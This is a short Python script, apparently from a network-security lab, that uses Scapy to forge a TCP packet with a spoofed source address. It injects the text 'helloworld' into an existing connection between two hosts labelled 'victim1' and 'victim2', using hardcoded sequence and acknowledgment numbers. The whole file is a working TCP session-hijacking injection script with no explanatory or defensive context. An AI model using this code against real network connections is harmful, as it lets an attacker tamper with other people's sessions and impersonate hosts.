from scapy.all import *

victim1 = "10.0.2.6"
victim1_mac = "08:00:27:8a:a1:b6"
victim2 = "10.0.2.7"
victim2_mac = "08:00:27:6a:a9:24"
word = "helloworld"
word_len = len(word)
ip = IP(src=victim1,dst=victim2,ttl=64)
tcp = TCP(sport=37996,dport=1234,flags="PA",seq=3398835083,ack=2835258051,window=229)
ip.chksum = None
tcp.chksum = None
npkt = ip/tcp/word
npkt.show2()
send(npkt)
